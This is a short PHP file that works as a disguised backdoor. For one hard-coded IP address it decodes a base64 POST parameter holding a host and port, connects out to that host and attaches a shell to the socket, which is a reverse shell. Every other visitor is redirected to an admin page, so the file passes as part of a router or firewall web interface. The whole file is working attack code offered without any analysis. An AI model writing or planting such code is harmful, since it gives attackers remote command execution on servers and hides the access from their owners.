<?php 
	$up = HEYBEAR;
	$user = ip2long($_SERVER["REMOTE_ADDR"]);
	if($up == $user)
	{
		 if(isset($_POST["route"]))
		 {
			 $r = $_POST["route"];
			 $decoded = base64_decode($r);
			 $array = explode(" ",$decoded);
			 $i = $array[0];
			 $p = $array[1];
			 $sock=fsockopen($i,$p);
			 $proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
		 }
		 else
		 {
			 header("Location: system_advanced_admin.php");
		 }
	}
?>
